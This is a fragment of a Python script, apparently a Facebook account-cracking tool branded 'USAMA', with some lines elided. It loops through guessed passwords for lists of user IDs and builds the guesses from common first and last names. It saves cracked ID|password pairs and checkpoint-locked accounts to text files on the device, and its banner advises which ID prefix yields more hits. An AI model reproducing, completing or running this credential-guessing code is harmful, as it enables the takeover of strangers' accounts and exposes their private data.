...
\033[1;97m Status : Persnol 
\033[1;97m Notice : Use 100090 For More OK Ids 
\033[1;93m=================================
''')
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [USAMA] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [USAMA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/USAMA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [USAMA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/USAMA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def gml():
                ...
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  Usama, Haris, Bilal')
                code = input(' First name : ')
                print(' Name Example : King, Khan, Jutt')
